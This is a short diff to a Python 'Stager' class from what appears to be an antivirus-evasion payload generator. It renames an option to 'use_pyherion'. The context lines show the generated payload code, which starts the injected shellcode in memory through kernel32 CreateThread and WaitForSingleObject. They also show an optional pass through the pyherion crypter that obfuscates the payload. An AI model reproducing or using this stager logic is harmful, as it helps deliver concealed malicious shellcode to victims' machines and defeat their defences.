@@ -37,7 +37,7 @@ class Stager:
 		self.shellcode = shellcode.Shellcode()
 		# options we require user interaction for- format is {Option : [Value, Description]]}
 		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-						"use_encrypter" : ["N", "Use the python encrypter"]}
+						"use_pyherion" : ["N", "Use the pyherion encrypter"]}
 	
 	def generate(self):
 		
@@ -79,7 +79,7 @@ class Stager:
 		PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
 		PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
 
-		if self.required_options["use_encrypter"][0].lower() == "y":
+		if self.required_options["use_pyherion"][0].lower() == "y":
 			PayloadCode = crypters.pyherion(PayloadCode)
 			
 		return PayloadCode
